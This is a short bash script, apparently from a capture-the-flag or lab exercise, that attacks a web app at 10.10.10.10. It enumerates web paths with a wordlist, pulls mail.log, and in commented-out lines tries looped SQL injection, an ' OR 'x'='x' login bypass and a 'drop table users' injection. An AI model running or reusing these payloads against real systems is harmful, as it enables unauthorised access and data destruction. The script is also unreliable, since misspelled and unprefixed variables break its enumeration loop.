#!/usr/bin/env bash

target='http://10.10.10.10'

while IFS='' read name
do
    attemtp=$(curl -sL "target$name" -w %{http_code})
    code=${attempt: -3}
    if [[ "$code" == "200" ]]
    then
        echo "name" >> enumerated_files.txt
    fi
done < /usr/share/wordlists/SecLists/Discovery/Web-Content/quickhits.txt
# PAGES

## LOGIN
#curl "$target/login.php" --cookie-jar cookie -O
#curl "$target/script.js" -O
curl "$target/mail.log" -O

### SQL INJECTION TEST
#username='test'
#password='test'
#while IFS='' read inject
#do
#   attempt=$(curl -sL -d "username=$username $inject" -d "password=$password" "$target/functions.php" --cookie-jar login.cookie)
#   size=${#attempt}
#   if [[ $size != 56 ]]
#   then
#       echo $inject
#       curl -sL --cookie login.cookie --cookie-jar login.cookie "$target/dashboard.php" -O
#   fi
#done < injects.txt

## Authenticated
#curl -sL -d "username=$username ' OR 'x'='x'#;" -d "password=$password" "$target/functions.php" --cookie-jar login.cookie

# Check Dashboard
#curl -sL --cookie login.cookie "$target/dashboard.php" -O
#curl -sL --cookie login.cookie "$target/edit_leaderboard.php" -O

## Edit Leaderboard
#curl -sL --cookie login.cookie -d "country=USD" -d "rank=1" -d "gold=100; drop table users #;" "$target/edit_leaderboard.php" -O
